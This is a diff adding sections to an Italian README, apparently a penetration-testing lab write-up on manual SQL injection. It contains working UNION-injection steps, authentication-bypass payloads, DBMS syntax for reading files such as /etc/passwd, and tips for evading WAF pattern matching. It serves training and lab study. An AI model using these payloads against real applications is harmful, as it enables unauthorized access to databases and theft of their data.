@@ -1,3 +1,5 @@
+> [English](README.en.md) | **Italiano**
+
 # Manual SQL Injection (SQLi)
 
 > - **Fase:** Web Attack - SQL Injection (Manual)
@@ -172,6 +174,75 @@ L'utente del database utilizzato dall'applicazione web non dovrebbe avere access
 4. WAF (Web Application Firewall):
 
 Come misura di difesa in profondità, implementare un WAF per rilevare e bloccare pattern di attacco SQL comuni (es. `UNION SELECT`, `OR 1=1`).
+
+---
+
+## Analisi a Basso Livello: Meccanica della UNION Injection
+
+### Come Funziona ORDER BY per Contare le Colonne
+
+```
+Query originale del server:
+SELECT id, name, description FROM artists WHERE id = <INPUT>
+
+Step 1: Trovare il numero di colonne
+INPUT: 1 ORDER BY 1   -> OK (colonna 1 esiste)
+INPUT: 1 ORDER BY 2   -> OK (colonna 2 esiste)
+INPUT: 1 ORDER BY 3   -> OK (colonna 3 esiste)
+INPUT: 1 ORDER BY 4   -> ERRORE ("Unknown column '4' in 'order clause'")
+-> La query ha 3 colonne
+
+Step 2: Identificare colonne visibili nell'HTML
+INPUT: -1 UNION SELECT 'AAA','BBB','CCC'
+-> L'ID -1 non esiste, quindi la query originale non restituisce righe
+-> UNION aggiunge la riga ['AAA','BBB','CCC']
+-> Se nella pagina appaiono 'BBB' e 'CCC' -> colonne 2 e 3 sono reflected
+
+Step 3: Iniettare query nella colonna visibile
+INPUT: -1 UNION SELECT 1,version(),user()
+-> Colonna 2 mostra '8.0.22-0ubuntu' (versione MySQL)
+-> Colonna 3 mostra 'acuart@localhost' (utente DB)
+```
+
+### MySQL vs PostgreSQL vs MSSQL: Differenze Sintattiche
+
+| Operazione | MySQL | PostgreSQL | MSSQL |
+| :--- | :--- | :--- | :--- |
+| Commento | `#` o `-- -` | `--` | `--` |
+| Concatenazione | `CONCAT(a,b)` | `a \|\| b` | `a + b` |
+| Versione | `version()` | `version()` | `@@version` |
+| Current DB | `database()` | `current_database()` | `db_name()` |
+| Elenco tabelle | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` |
+| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` |
+| Stacked queries | Si (con mysqli_multi_query) | Si | Si |
+| File read | `LOAD_FILE('/etc/passwd')` | `pg_read_file()` | `OPENROWSET(BULK...)` |
+
+### Auth Bypass: Varianti del Payload
+
+```sql
+-- Payload base
+admin' #                    -- MySQL: commento con hash
+admin'--                    -- MSSQL/PostgreSQL: commento con doppio trattino
+admin' OR '1'='1            -- Universale: condizione sempre vera
+' OR 1=1--                  -- Senza username specifico: primo utente (spesso admin)
+' OR 1=1 LIMIT 1--         -- MySQL: forza un singolo risultato
+admin'/*                    -- MySQL: commento multi-linea (bypass WAF)
+
+-- Perche funziona 'admin' #':
+Query originale: SELECT * FROM users WHERE user='$input' AND pass='$pass'
+Dopo injection:  SELECT * FROM users WHERE user='admin' # AND pass='...'
+                                                         ^--- tutto dopo # e ignorato
+```
+
+---
+
+## Esperienza di Laboratorio
+
+La progressione da Auth Bypass (Scenario A) a UNION Injection (Scenario B) a Database Dumping (Scenario C) ha dimostrato la kill chain completa della SQL injection manuale. Ogni fase dipende dalla precedente: il bypass conferma la vulnerabilita, la UNION identifica la struttura del database, e il dump estrae i dati. Saltare una fase (ad esempio tentare il dump senza conoscere il numero di colonne) produce errori che possono allertare i sistemi di difesa.
+
+Il payload `0x3a` come separatore nel `group_concat()` e una tecnica operativa importante: usando il valore esadecimale dei due punti (`:`) si evita di introdurre apici o virgolette aggiuntivi nella query, che potrebbero rompere la sintassi SQL o essere bloccati da WAF basati su pattern matching. Analogamente, `0x0a` (newline) puo essere usato per formattare l'output multi-riga.
+
+Il confronto con SQLMap (WEB-011) ha evidenziato il valore dell'injection manuale: SQLMap avrebbe completato il dump in 2 minuti, ma la comprensione dei passaggi manuali e essenziale per i casi in cui SQLMap fallisce (WAF aggressivo, injection in parametri non standard come header HTTP o cookie, o quando il DBMS non e supportato). La competenza manuale e anche cio che distingue un operatore da un "tool jockey" durante un colloquio tecnico.
 
 ---
 
